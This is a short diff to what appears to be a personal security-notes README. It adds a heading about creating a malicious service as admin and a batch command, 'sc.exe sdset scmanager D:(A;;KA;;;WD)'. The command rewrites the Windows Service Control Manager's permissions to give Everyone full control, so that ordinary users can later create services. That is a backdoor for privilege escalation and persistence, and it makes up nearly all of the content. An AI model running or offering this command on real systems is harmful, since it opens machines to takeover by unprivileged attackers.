@@ -1,2 +1,6 @@
 # Sec
-Stuff I've decided to take out of my private repos.
+
+### Create malicous service as admin. (enables ability to create it as user afterwards.)
+```batch
+sc.exe sdset scmanager D:(A;;KA;;;WD)
+```
